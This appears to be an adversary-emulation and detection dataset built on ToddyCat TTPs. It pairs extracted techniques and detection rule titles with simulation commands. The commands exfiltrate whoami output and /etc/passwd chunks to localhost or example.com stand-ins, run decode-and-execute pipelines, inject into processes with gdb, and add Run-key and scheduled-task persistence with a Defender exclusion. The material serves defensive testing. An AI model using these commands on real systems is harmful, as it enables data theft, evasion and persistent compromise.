extracted_ttps.description: The attacker uses a proxy to connect to the C2 server, with the ability to specify the proxy type, address, and port.
The attacker uses process injection to inject arbitrary shellcode into a running process, allowing them to evade detection and execute malicious code.
The malware uses TCP and HTTP C2 communication intervals, indicating potential proxy usage for command and control.
Attacker used a proxy to forward TCP packets to arbitrary hosts
The attacker uses social engineering to trick users into executing malicious files, such as '01.09.2021 г..exe' and '03.09.2021 г.exe', which are loaders configured to run the Ninja component.
The malware uses an encrypted payload embedded in the binary, which is XORed with the constant value '0xAA' and compressed with the LZSS algorithm to evade detection.
The malware retrieves configuration parameters from the encrypted payload, which includes a list of 15 elements with specific values, such as a mutex name and C2 server information.
The attacker uses HTTP and HTTPS protocols to communicate with the C2 server, with the ability to customize the HTTP URL path and headers to mimic legitimate services.
The malware uses a User-Agent string 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv 11.0) like Gecko' to communicate with the C2 servers, which may be used to masquerade as a legitimate browser.
The malware creates and modifies registry keys to maintain persistence on the system, including the creation of the WebUpdate service.
The malware uses HTTP and HTTPS protocols with specific headers, such as 'Content-Type: application/x-www-form-urlencoded', to communicate with the C2 servers.
The malware uses the command line to execute the svchost.exe process with the -k httpsvc argument to maintain persistence on the system.

The attacker modifies the Windows registry to store the final payload, using registry keys such as $HKLM\SOFTWARE\Classes\Interface\{6FD0637B-85C6-D3A9-CCE9-65A3F73ADED9} and $HKLM\SOFTWARE\Classes\Interface\{AFDB6869-CAFA-25D2-C0E0-09B80690F21D}.
The malware relies on the user to execute the malicious DLL loader, which is disguised as a legitimate system file.
The malware checks for the presence of the .NET framework version 2.0 by attempting to open the corresponding registry key.
The attacker uses the 'netsh http show servicestate verbose=yes' command to discover open HTTP ports and detect the presence of the Samurai backdoor.
The malware is executed on the system, and it starts operations by retrieving configuration parameters from the encrypted payload.
The malware gathers system information, including the presence of specific registry keys and the .NET framework version.
The malware uses system commands like 'at' and 'cmd', indicating potential usage of command and scripting interpreters.
The attacker modifies the system's registry to configure the malware's working time and other settings.
Detected Process Injection activity via NLP pattern matching
The attacker uses encryption and encoding algorithms to protect malware communications.
The malware uses a mutex name, which could be used to achieve boot or logon autostart execution.
The attacker uses the 'at' and 'cmd' commands to execute system commands and scripts.

extracted_ttps.technique_name: Exfiltration Over Command and Control Channel
extracted_ttps.description: The attacker exfiltrates system information and other data through the C2 channel.
The attacker uses signed binaries, such as svchost.exe, to execute malicious code and evade detection.
ToddyCat exploited an unknown vulnerability in Microsoft Exchange servers to gain initial access
Attacker uses command line arguments to interact with the agent
ToddyCat used the Samurai backdoor and Ninja Trojan for remote access
Attacker provides input to the agent to read or write data
ToddyCat modified registry keys to load the Samurai backdoor
ToddyCat sent malicious loaders via Telegram to infect desktop machines
Attacker loaded malware into memory without storing it on disk
ToddyCat used compromised servers to move laterally within the network
ToddyCat used remote services to move laterally within the network
Attacker used the 'dir' command to enumerate files and directories
Attacker used remote access tools to control the compromised system
ToddyCat relied on user execution to infect desktop machines
Attacker discovers active sessions and pipe handles
ToddyCat used the debug.exe dropper to execute commands
Attacker modified environment variables to configure the malware
Attacker used user execution to run the malware
Attacker used cmd.exe to execute commands

rules.title: Detect Use of Proxy Configuration Flags in Child Processes
rules.description: Detect processes that are launched with proxy‑related command‑line arguments (e.g., --proxy, -proxy) from common scripting or scheduled‑task parent processes, indicating potential use of a proxy for C2 communication.
falsepositives: Legitimate IT administration scripts that configure system or user proxy settings
Corporate PowerShell or batch scripts that set proxy for package managers or web requests
Scheduled tasks that run maintenance scripts with proxy parameters

rules.title: Suspicious Executable Launch with Date or Cyrillic Filename from Explorer
rules.description: Detects execution of .exe files whose names contain date patterns or Cyrillic characters, launched by explorer.exe, indicating possible user execution of malicious loaders.
falsepositives: Legitimate installers or internal tools that include dates in their filenames (e.g., patch_2021.09.01.exe).
Corporate applications with Cyrillic names used by the organization.
User‑initiated software updates launched via Explorer.

rules.title: Application Window Discovery via EnumWindows or user32.dll

falsepositives: Legitimate automation scripts using Python to interact with GUI (e.g., PyAutoGUI, pywinauto).

attacks.command: netsh winhttp set proxy proxy-server="http=192.168.10.10:8080"; certutil -urlcache -split -f http://test.com/payload.txt %TEMP%\payload.txt
attacks.description: Configures system-wide WinHTTP proxy and downloads a file using certutil, which respects the proxy setting.
attacks.expected_behavior: Sets a system proxy via netsh (requires admin), then uses certutil to download a test file through the proxy. The file is saved to %TEMP%\payload.txt if the server responds.

attacks.description: Uses PowerShell to download a file via a specified proxy with default user credentials.
attacks.expected_behavior: Sends an HTTP request to test.com via the specified proxy using stored credentials. Saves output to %TEMP%\info.txt. Fails silently if network is unreachable or proxy is invalid.

attacks.command: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /d "192.168.10.10:8080" /f & reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f & bitsadmin /transfer myDownload /download /priority normal http://test.com/file.txt %TEMP%\file.txt
attacks.description: Enables a user-level proxy via registry and uses BITSAdmin to download a file through the proxy.
attacks.expected_behavior: Modifies current user proxy settings in the registry, then uses BITSAdmin (which respects IE proxy settings) to download a file. No admin rights needed as changes are per-user. Proxy settings persist until manually cleared.

attacks.description: Basic proxy usage: curl connects to the remote server through an HTTP proxy and downloads a test payload to /tmp.
attacks.expected_behavior: curl establishes a connection to example.com via the proxy at 127.0.0.1:8080 and writes the received data to /tmp/payload.bin.

attacks.description: Intermediate proxy usage: sets the http_proxy environment variable and uses wget to fetch a script through the proxy, piping it to the shell.
attacks.expected_behavior: wget retrieves script.sh via the proxy and streams it to sh for execution; in a test environment the script should be benign.

attacks.description: Advanced proxy usage: SSH connection is tunneled through an HTTP proxy using netcat's ProxyCommand option.
attacks.expected_behavior: ssh initiates a connection to c2.example.com via the proxy at 127.0.0.1:8080; the remote command 'whoami' runs and returns the username.

attacks.description: Basic simulation of process invocation using a legitimate Windows binary to load a DLL, mimicking initial execution vector for injection.
attacks.expected_behavior: Opens the Control Panel, demonstrating a legitimate use of rundll32.exe, which can be abused in process injection attacks to execute arbitrary code.

attacks.command: powershell -Command "Start-Process notepad -WindowStyle Hidden; Start-Sleep -Seconds 2; $proc = Get-Process notepad; $addr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi('MessageBoxA'); $addr2 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi('Hello from simulated injection'); "
attacks.description: Intermediate simulation using PowerShell to interact with process memory APIs via P/Invoke-like behavior, without direct .NET reflection, to mimic injection preparation.
attacks.expected_behavior: Starts notepad hidden, waits, then simulates preparation of injection by allocating unmanaged memory with test strings. No actual injection occurs.

attacks.command: powershell -Command "$content = 'TestInjectionStub'; $path = "$env:TEMP\debug.bin"; Set-Content -Path $path -Value $content -Force; Start-Process rundll32.exe -ArgumentList ".\shell32.dll,Control_RunDLL $env:TEMP\debug.bin" -WindowStyle Hidden -ErrorAction SilentlyContinue; Remove-Item "$env:TEMP\debug.bin" -ErrorAction SilentlyContinue"
attacks.description: Advanced simulation involving file drop and execution via DLL side-loading technique, using rundll32 to load a benign binary file as a proxy for injected code.
attacks.expected_behavior: Writes a benign test string to a temporary binary file, then executes it via rundll32 in hidden mode, simulating a file-based process injection chain. The file is cleaned up afterward.

attacks.description: Basic process injection using GDB to execute a benign command in a running sleep process
attacks.expected_behavior: The sleep process creates /tmp/test_procinject via injected system() call

attacks.command: sleep 60 & PID=$!; sudo gdb -p $PID -ex 'call (void*)malloc(128)' -ex 'call (void)memcpy($1, "\x90\x90\x90\xcc", 4)' -ex 'call (void (*)()) $1()' -ex detach -ex quit
attacks.description: Intermediate shellcode injection into process memory using GDB to allocate and execute NOP sled with breakpoint
attacks.expected_behavior: Executes injected shellcode (NOPs + int3 instruction) potentially triggering a debug breakpoint

attacks.command: sleep 600 & PID=$!; ADDR=$(sudo gdb -p $PID -ex 'p/x (void*)malloc(128)' -ex 'detach' -ex 'quit' | grep -o '0x[0-9a-f]*'); echo -n 'test' | sudo dd of=/proc/$PID/mem seek=$(printf '%d' $ADDR) bs=1 conv=notrunc
attacks.description: Advanced memory overwrite via /proc filesystem after allocating memory with GDB
attacks.expected_behavior: Directly writes 'test' string to allocated memory region in target process demonstrating arbitrary memory modification

attacks.description: Downloads a malicious executable from a URL and executes it
attacks.expected_behavior: The malicious executable will be downloaded and executed, potentially leading to a compromise of the system

attacks.description: Executes a malicious executable using PowerShell
attacks.expected_behavior: The malicious executable will be executed, potentially leading to a compromise of the system

attacks.description: Executes a malicious executable using the command prompt
attacks.expected_behavior: The malicious executable will be executed, potentially leading to a compromise of the system

attacks.description: Basic example of executing a malicious script
attacks.expected_behavior: The script will execute in the user's context, potentially leading to unauthorized actions.

attacks.description: Intermediate example that first makes the script executable and then runs it
attacks.expected_behavior: The script will be made executable and then executed, demonstrating a more sophisticated approach to user execution.

attacks.description: Advanced example requiring admin privileges to execute a script
attacks.expected_behavior: The script will execute with elevated privileges, potentially leading to significant system compromise.

attacks.description: Basic in-memory XOR decryption of a benign string 'Hello' using key 0xAA
attacks.expected_behavior: Outputs the decrypted string 'Hello' to console after XORing each byte with 0xAA

attacks.description: Intermediate: Write XOR-encoded bytes to temp file, decrypt in PowerShell, output result, and clean up
attacks.expected_behavior: Creates a file in %TEMP% with hex-like bytes, reads and XOR-decrypts them, prints 'Hello', then deletes the file

attacks.command: powershell -Command "$xorKey = 0xAA; $lzssSim = [byte[]](0x48, 0x65, 0x6C, 0x6C, 0x6F); $enc = ($lzssSim | ForEach-Object { $_ -bxor $xorKey }); $encPath = '$env:TEMP\p.bin'; [System.IO.File]::WriteAllBytes($encPath, $enc); Start-Sleep 1; $dec = [System.IO.File]::ReadAllBytes($encPath) | ForEach-Object { $_ -bxor $xorKey }; $decomp = [System.Text.Encoding]::ASCII.GetString($dec); Remove-Item $encPath -Force -ErrorAction SilentlyContinue; $decomp"
attacks.description: Advanced: Simulate LZSS-compressed and XOR-encrypted payload by writing encrypted data to disk, then decrypt and 'decompress' in memory
attacks.expected_behavior: Writes XOR-encrypted data to %TEMP%\p.bin, reads it back, decrypts using 0xAA, converts to string, outputs 'Hello', and removes the file

attacks.command: echo "echo 'Benign payload'" | while IFS= read -n1 c; do printf "\\x%02x" $(( ( $(printf "%d" "'$c") ) ^ 0xAA )); done | xxd -r -p | gzip > /tmp/payload.bin && gunzip -c /tmp/payload.bin | while IFS= read -n1 c; do printf "\\x%02x" $(( ( $(printf "%d" "'$c") ) ^ 0xAA )); done | xxd -r -p | bash
attacks.description: Basic: Creates XOR-encrypted (0xAA) + gzip-compressed payload, decrypts/decompresses/executes
attacks.expected_behavior: Encrypts 'echo "Benign payload"' with XOR 0xAA, compresses with gzip, writes to /tmp/payload.bin. Decrypts, decompresses, and executes to print message.

attacks.command: head -c 100 /dev/urandom | while IFS= read -n1 c; do printf "\\x%02x" $(( (0x$(printf "%02x" "'$c") ) ^ 0xAA )); done | xxd -r -p | gzip > /tmp/encrypted.dat && gunzip -c /tmp/encrypted.dat | while IFS= read -n1 c; do printf "\\x%02x" $(( (0x$(printf "%02x" "'$c") ) ^ 0xAA )); done | xxd -r -p > /tmp/decrypted.dat
attacks.description: Intermediate: Encrypts random data with XOR 0xAA + gzip, decrypts to file
attacks.expected_behavior: Processes binary data through XOR+gzip pipeline without execution, creating /tmp/decrypted.dat with original random bytes

attacks.command: (echo "SIGNATURE" && echo "echo 'Advanced benign payload'" | while IFS= read -n1 c; do printf "\\x%02x" $(( (0x$(printf "%02x" "'$c") ) ^ 0xAA )); done | xxd -r -p | gzip ) > /tmp/advanced.bin && tail -c +$(($(echo -n "SIGNATURE" | wc -c)+1)) /tmp/advanced.bin | gunzip | while IFS= read -n1 c; do printf "\\x%02x" $(( (0x$(printf "%02x" "'$c") ) ^ 0xAA )); done | xxd -r -p | bash
attacks.description: Advanced: Embeds signed payload with XOR+gzip layers, extracts and executes
attacks.expected_behavior: Creates file with signature header and encrypted payload. Extracts payload, decrypts, decompresses, and executes to print message

attacks.description: Enumerate processes with a main window title, which can help in discovering application windows.
attacks.expected_behavior: Lists processes with their main window titles and IDs, if any.

attacks.description: Use the tasklist command with verbose output to list all tasks, including their window titles.
attacks.expected_behavior: Lists all running tasks with detailed information, including window titles.

attacks.command: powershell -Command "Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::Shell("cmd /c title TestWindow & echo TestWindow", 1, 1000)"
attacks.description: Create a new window with a specific title using PowerShell and the Microsoft.VisualBasic assembly, then discover it.
attacks.expected_behavior: Creates a new command prompt window titled 'TestWindow' for a short duration, demonstrating window creation and potential discovery.

attacks.description: Enumerate all windows on the root window, demonstrating basic application window discovery.
attacks.expected_behavior: Lists all windows, including their IDs and geometries.

attacks.description: Search for windows with the class 'firefox', showing an intermediate use of window discovery to find specific application instances.
attacks.expected_behavior: Returns the window IDs of all Firefox windows.

attacks.description: List all windows in a detailed format, including their IDs, titles, and geometries, demonstrating an advanced use of window discovery for comprehensive window enumeration.
attacks.expected_behavior: Provides detailed information about all windows, useful for advanced window management and automation tasks.

attacks.description: Download a file using certutil with a custom User-Agent string
attacks.expected_behavior: The file will be downloaded to the temp directory

attacks.command: powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy(''); $webRequest = [System.Net.WebRequest]::Create('http://example.com'); $webRequest.Method = 'GET'; $webRequest.UserAgent = 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv 11.0) like Gecko'; $response = $webRequest.GetResponse();"
attacks.description: Send an HTTP request with a custom User-Agent string using PowerShell
attacks.expected_behavior: The HTTP request will be sent with the custom User-Agent string

attacks.command: powershell -Command "&{echo 'Hello, this is a phishing email' | Out-File -FilePath %TEMP%\phishing_email.txt};"
attacks.description: Create a phishing email using PowerShell
attacks.expected_behavior: A file named phishing_email.txt will be created in the temp directory with the phishing email content

attacks.command: curl -A 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko' http://example.com
attacks.description: Basic phishing command using curl
attacks.expected_behavior: Sends a request to example.com with a fake User-Agent string and displays the response

attacks.command: wget --user-agent='Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko' http://example.com
attacks.description: Intermediate phishing command using wget
attacks.expected_behavior: Sends a request to example.com with a fake User-Agent string and saves the response to a file

attacks.command: curl -A 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko' -o /dev/null http://example.com
attacks.description: Advanced phishing command using curl with output redirection
attacks.expected_behavior: Sends a request to example.com with a fake User-Agent string and discards the response

attacks.description: Modify registry to add a test service
attacks.expected_behavior: Adds a registry key to run cmd.exe on startup

attacks.description: Modify registry using PowerShell to add a test service
attacks.expected_behavior: Adds a registry key to run cmd.exe on startup

attacks.description: Modify registry to add a test service with a file from APPDATA
attacks.expected_behavior: Adds a registry key to run a file from APPDATA on startup

attacks.description: Creates a basic systemd service file for persistence
attacks.expected_behavior: A new file is created in /etc/systemd/system/, which could potentially be used to maintain persistence on the system.

attacks.description: Enables the created service to start at boot, demonstrating persistence
attacks.expected_behavior: The webupdate service is enabled to start at boot, showing how an attacker could achieve persistence.

attacks.description: Updates the system's init script links to start the webupdate service, another form of persistence
attacks.expected_behavior: The webupdate service is configured to start at system boot through init scripts, demonstrating an alternative persistence method.

attacks.description: Uses certutil, a built-in Windows binary, to make an HTTPS request to a C2-like server and cache the response.
attacks.expected_behavior: Sends an HTTPS GET request to https://example.com/c2 and saves the response to a file in the user's TEMP directory. This simulates malware downloading content over an encrypted channel.

attacks.description: Uses PowerShell to send an HTTPS POST request with a specific Content-Type header to simulate C2 communication.
attacks.expected_behavior: Sends a POST request over HTTPS to https://example.com/post with form-encoded data and a custom header. This mimics how malware may exfiltrate data using standard web protocols.

attacks.command: powershell -Command "try { $url = 'https://example.com/beacon'; $data = 'id=123&status=alive'; $headers = @{ 'Content-Type' = 'application/x-www-form-urlencoded' }; $response = Invoke-WebRequest -Uri $url -Method POST -Body $data -Headers $headers -UseBasicParsing -TimeoutSec 30; } catch { } finally { Start-Sleep -Seconds 5 }"
attacks.description: Advanced simulation of periodic C2 beaconing over HTTPS with error handling and sleep intervals.
attacks.expected_behavior: Sends a POST request to https://example.com/beacon with URL-encoded data and proper headers, simulating beaconing behavior. Includes exception handling and a 5-second delay to mimic real C2 timing. No data is exfiltrated beyond test strings.

attacks.description: Basic HTTP POST request with specific Content-Type header
attacks.expected_behavior: Sends HTTP POST to example.com with test data and correct headers. Server may return 404, but command demonstrates C2 pattern.

attacks.description: Intermediate HTTPS POST with additional User-Agent header mimicking browser traffic
attacks.expected_behavior: Sends encrypted HTTPS POST with headers to example.com. Demonstrates blending C2 traffic with common user-agent strings.

attacks.command:
(echo -e 'POST /submit HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

key=val'; sleep 1) | openssl s_client -connect example.com:443 -quiet
attacks.description: Advanced manual HTTPS request using openssl to craft encrypted channel
attacks.expected_behavior: Establishes raw SSL connection and sends crafted HTTP POST. Shows low-level encrypted channel creation without standard HTTP tools.

attacks.description: Basic execution of svchost.exe with a common service group key to simulate legitimate service hosting behavior.
attacks.expected_behavior: Attempts to start svchost.exe with the netsvcs group key. May fail silently if not invoked through proper service control manager, but process execution attempt is logged.

attacks.description: Intermediate method using 'start' command to launch svchost.exe in background with httpsvc group key, simulating stealthy execution.
attacks.expected_behavior: Executes svchost.exe with the httpsvc group key in a separate process. The 'start /b' allows background execution without opening a new window. No actual service is hosted.

attacks.command: powershell -Command "try { Start-Process svchost.exe -ArgumentList '-k', 'httpsvc' -WindowStyle Hidden -ErrorAction Stop } catch { $null }"
attacks.description: Advanced method using PowerShell to launch svchost.exe hidden with the httpsvc argument, simulating stealthy persistence execution.
attacks.expected_behavior: Starts svchost.exe with -k httpsvc in a hidden window. The process may not function correctly outside the service manager context, but the execution attempt is valid for detection testing.

attacks.description: Basic execution using sh interpreter to write a test log
attacks.expected_behavior: Creates or appends to /tmp/test_script.log with a benign message

attacks.command: bash -c 'if [ -f /tmp/update.sh ]; then chmod +x /tmp/update.sh && /tmp/update.sh; else echo "#!/bin/bash\necho \"Update running\" > /tmp/update.log" > /tmp/update.sh && /tmp/update.sh; fi'
attacks.description: Intermediate script check: runs existing script or creates and executes a new one
attacks.expected_behavior: Creates /tmp/update.sh if it doesn't exist, then executes it, writing to /tmp/update.log

attacks.command:
python -c "exec('import os
if not os.path.exists("/tmp/.hidden_runner"):
  with open("/tmp/.hidden_runner", "w") as f:
    f.write("#!/bin/bash
echo \"Persistent script running\" >> /tmp/persistence.log
sleep 1
")
  os.chmod("/tmp/.hidden_runner", 0o755)
  os.system("/tmp/.hidden_runner &")')" 2>/dev/null || true
attacks.description: Advanced: Uses Python to generate and execute a hidden background script, simulating stealthy execution
attacks.expected_behavior: Creates a hidden script in /tmp, sets execute permissions, and runs it in background to append log entries

attacks.description: Query the registry recursively under NDP key to discover installed .NET Framework versions using built-in reg.exe.
attacks.expected_behavior: Outputs list of installed .NET Framework versions and related registry data to stdout; runs without errors on all Windows systems with .NET installed (most systems).

attacks.command: powershell -Command "try { $ndp = Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full' -ErrorAction SilentlyContinue; if ($ndp -and $ndp.Release -ge 0) { Write-Output "Detected .NET version: $($ndp.Release)" } } catch { Write-Output 'No .NET v4 Full detected' }"
attacks.description: Use PowerShell to safely check for .NET v4 Full release version in registry with error suppression.
attacks.expected_behavior: Prints detected .NET v4 Full release version if present; otherwise outputs fallback message. Uses safe registry access with error handling.

attacks.command: powershell -Command "& {$r = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics'; if (Test-Path $r) { Get-ItemProperty -Path $r -ErrorAction SilentlyContinue | Format-List } else { Write-Output 'Registry path not present' }}"
attacks.description: Check for presence of diagnostics-related registry key as an indicator of system configuration, using PowerShell with safe path validation.
attacks.expected_behavior: If the registry key exists, outputs its properties in list format; otherwise prints 'Registry path not present'. No changes are made to the system.

attacks.description: Basic system information discovery using uname
attacks.expected_behavior: Displays kernel version, hostname, and hardware architecture

attacks.description: Check for installed .NET-related packages on Debian-based systems
attacks.expected_behavior: Lists any installed .NET Core or ASP.NET Core packages

attacks.command: sh -c 'command -v dotnet >/dev/null && dotnet --version || echo ".NET not installed"'
attacks.description: Advanced .NET version check with error handling
attacks.expected_behavior: Outputs installed .NET CLI version or indicates absence

attacks.description: Basic obfuscation using Base64 string piped to certutil for decoding to a temporary file.
attacks.expected_behavior: Decodes the Base64 string 'YmVuZWlnbl9wYXlsb2Fk' (which is 'benign_payload') using certutil, writes it to a temp file, displays it, then deletes the file.

attacks.description: Intermediate obfuscation using PowerShell to decode a Base64-encoded Unicode string and execute it.
attacks.expected_behavior: Decodes a Base64 string representing the PowerShell command 'test_command | Out-String', then executes it. The command outputs text to the console.

attacks.command: echo dGVzdF9jb21tYW5k | certutil -decode - %TEMP%\stage1.bin > nul && for /f %i in (%TEMP%\stage1.bin) do echo Running: %i & %i & del %TEMP%\stage1.bin -ErrorAction SilentlyContinue
attacks.description: Advanced obfuscation using certutil to decode a command from Base64, then execute it via cmd shell parsing.
attacks.expected_behavior: Decodes 'dGVzdF9jb21tYW5k' (Base64 for 'test_command') into a file, reads it via FOR loop, executes the command (echoed as 'Running: test_command'), then deletes the file. Uses only built-in Windows tools.

attacks.command: echo 'echo Hello from encoded script' > /tmp/plain.sh && base64 /tmp/plain.sh > /tmp/plain.sh.b64 && rm /tmp/plain.sh && base64 -d /tmp/plain.sh.b64 > /tmp/decoded.sh && chmod +x /tmp/decoded.sh && /tmp/decoded.sh
attacks.description: Create a simple script, encode it with Base64, delete the original, decode back, and execute the decoded script.
attacks.expected_behavior: Outputs 'Hello from encoded script' to the console after decoding and executing the script.

attacks.command: echo 'echo Sensitive data' > /tmp/secret.sh && openssl enc -aes-256-cbc -salt -pbkdf2 -pass pass:MySecretPass -in /tmp/secret.sh -out /tmp/secret.enc && base64 /tmp/secret.enc > /tmp/secret.enc.b64 && rm /tmp/secret.sh /tmp/secret.enc && base64 -d /tmp/secret.enc.b64 > /tmp/secret.enc && openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:MySecretPass -in /tmp/secret.enc -out /tmp/secret_dec.sh && chmod +x /tmp/secret_dec.sh && /tmp/secret_dec.sh
attacks.description: Encrypt a script with AES-256-CBC using OpenSSL, then Base64-encode the ciphertext. Afterwards, decode and decrypt to recover and execute the original script.
attacks.expected_behavior: Outputs 'Sensitive data' to the console after decryption and execution.

attacks.command: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Test /t REG_SZ /d "C:\Windows\System32\cmd.exe /c echo Hello World!" /f
attacks.description: Adds a registry key to run a command at logon using reg.exe, a legacy binary.
attacks.expected_behavior: A new registry key is added under HKCU to execute a command at logon.

attacks.command: powershell -Command "$mutexName = 'Global\\\MyMutex'; $scriptPath = '$env:TEMP\test.ps1'; Set-Content -Path $scriptPath -Value 'Write-Host "Hello World!"'; Add-MpPreference -ExclusionPath $scriptPath; schtasks /create /tn Test /tr powershell -File $scriptPath /sc onstart /ru System"
attacks.description: Creates a PowerShell script to be executed at startup, utilizing a mutex name and scheduled tasks for persistence, while excluding the script path from Windows Defender scans.
attacks.expected_behavior: A PowerShell script is created and scheduled to run at system start, executing a benign command.

attacks.command:
mkdir "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -ErrorAction SilentlyContinue; Set-Content -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\test.bat" -Value "@echo off
echo Hello World!" -Force
attacks.description: Creates a batch file in the startup directory to execute a command at logon, ensuring the directory exists first and using PowerShell for file operations.
attacks.expected_behavior: A batch file is created in the startup directory to print a message at logon.

attacks.description: Adds a user-level cron job that executes a test command at boot
attacks.expected_behavior: The cron job will run once at next boot and append 'test beacon' to /tmp/persistence_test.log. No actual malware is executed.

attacks.description: Creates a system-wide cron job that runs every 5 minutes as root
attacks.expected_behavior: Every 5 minutes, a file /tmp/cron_test is created or truncated. This demonstrates system-level persistence via cron. The command is benign but requires root to write to /etc/cron.d/

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: ipconfig /all | certutil.exe -urlcache -f http://127.0.0.1/upload ipconfig.txt && certutil.exe -urlcache -f http://127.0.0.1/upload ipconfig.txt
attacks.description: Basic exfiltration: Capture network configuration and 'upload' via HTTP POST simulation using certutil.
attacks.expected_behavior: Runs ipconfig /all, saves output to ipconfig.txt in current directory, then simulates upload to a remote server using certutil. The target URL is local for testing. No data is actually exfiltrated in isolated environments.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: whoami /all > %TEMP%\system_info.txt & net user >> %TEMP%\system_info.txt & powershell -Command "Invoke-WebRequest -Uri http://127.0.0.1/upload -Method POST -Body (Get-Content '%TEMP%\system_info.txt' | Out-String) -ContentType 'text/plain' -ErrorAction SilentlyContinue"
attacks.description: Intermediate exfiltration: Collect system and user info, then send via PowerShell Invoke-WebRequest.
attacks.expected_behavior: Gathers current user privileges and local user accounts into a temporary file, then sends the content via HTTP POST to a mock endpoint. Uses built-in commands and PowerShell for exfiltration. Execution is silent on success.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: mkdir %TEMP%\exfil -ErrorAction SilentlyContinue 2>nul && whoami /all > %TEMP%\exfil\data.txt && ipconfig /dnsflush >> %TEMP%\exfil\data.txt && powershell -Command "Compress-Archive -Path '%TEMP%\exfil\data.txt' -DestinationPath '%TEMP%\exfil.zip' -Force -ErrorAction SilentlyContinue; $enc = [Convert]::ToBase64String([IO.File]::ReadAllBytes('%TEMP%\exfil.zip')); Invoke-WebRequest -Uri http://127.0.0.1/exfil -Method POST -Body $enc -ContentType 'application/octet-stream' -ErrorAction SilentlyContinue; Remove-Item '%TEMP%\exfil' -Recurse -ErrorAction SilentlyContinue"
attacks.description: Advanced exfiltration: Gather system data, compress and base64-encode it, then send via HTTP POST.
attacks.expected_behavior: Creates a temporary directory, collects user and network info, compresses the file into a ZIP archive, encodes it in Base64, and sends it in a POST request body. Cleans up local artifacts afterward. Simulates realistic data staging and exfiltration over C2 channel using common tools.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Basic exfiltration of simulated system information via HTTP POST using curl.
attacks.expected_behavior: Sends a small test string to a local endpoint over HTTP. No real data is exfiltrated. Fails silently if no server is listening.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Intermediate exfiltration: compresses a sensitive system file and streams it via HTTP using curl and tar.
attacks.expected_behavior: Compresses /etc/passwd and sends it as binary data in a POST request. Requires root to read /etc/passwd in some environments. Simulates exfiltration of critical OS files.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: dd if=/etc/passwd bs=1 count=64 2>/dev/null | base64 | xargs -I {} curl -X POST -d 'data={}' http://127.0.0.1:8080/chunk
attacks.description: Advanced exfiltration: reads a chunk of a file, base64-encodes it, and sends it via HTTP to simulate staged exfiltration over C2.
attacks.expected_behavior: Reads first 64 bytes of /etc/passwd, encodes them in base64, and sends as POST data. Mimics chunked exfiltration to evade detection. Safe for testing as no recursion or system-wide operations are used.

attacks.description: Uses the signed setuid binary pkexec to run a bash command that writes a test file, demonstrating proxy execution via a trusted binary.
attacks.expected_behavior: A file named .signed_proxy_test containing the string SignedProxy is created in the invoking user's home directory.

attacks.description: Leverages the signed systemd binary to spawn a transient system service that runs a bash command, acting as a proxy for malicious code.
attacks.expected_behavior: A transient systemd service named proxy_test.service is created and a file /tmp/proxy_exec_test with content ProxyExec is written.

attacks.description: Uses the signed ssh client binary with a ProxyCommand that runs a bash command, thereby executing code via a trusted binary proxy.
attacks.expected_behavior: When the ssh connection is attempted, the ProxyCommand runs and creates /tmp/ssh_proxy_test containing the string SSHProxy.

attacks.description: Download a benign file from a local web server using certutil.exe
attacks.expected_behavior: The benign file is downloaded to the temporary directory

attacks.description: Use PowerShell to decode a Base64 string and write it to a file
attacks.expected_behavior: A file named hello.txt is created in the temporary directory with the decoded string

attacks.description: Create a new directory and download a benign file into it using PowerShell
attacks.expected_behavior: A new directory is created in the temporary directory and the benign file is downloaded into it

attacks.description: Basic: Simulate sending a GET request with a malicious payload to a vulnerable endpoint
attacks.expected_behavior: Send a GET request to the specified URL with a malicious payload

attacks.description: Intermediate: Simulate sending a POST request with a malicious payload to a vulnerable endpoint
attacks.expected_behavior: Send a POST request to the specified URL with a malicious payload

attacks.description: Advanced: Simulate sending a GET request with a malicious payload and a custom User-Agent header to a vulnerable endpoint
attacks.expected_behavior: Send a GET request to the specified URL with a malicious payload and a custom User-Agent header

attacks.description: Start the Remote Desktop Service to allow remote connections
attacks.expected_behavior: Remote Desktop Service starts, allowing incoming connections

attacks.description: Establish a TCP connection to a remote server using PowerShell
attacks.expected_behavior: A TCP connection is established to the specified remote server and then closed

attacks.command: cmd.exe /c "sc config upnphost start= auto & net start upnphost"
attacks.description: Configure and start the UPnP Host service to allow remote access
attacks.expected_behavior: UPnP Host service is configured to start automatically and then started, potentially allowing remote access

attacks.description: Download and execute a remote shell script using wget (basic reverse shell drop)
attacks.expected_behavior: Downloads a script from a remote server, makes it executable, and runs it in the background. Simulates initial backdoor deployment.

attacks.description: Use curl to fetch and execute a remote access script (intermediate variant with common tooling)
attacks.expected_behavior: Fetches a script from attacker-controlled server and executes it via sh in the background. Leaves no explicit trace in command history if shell is non-interactive.

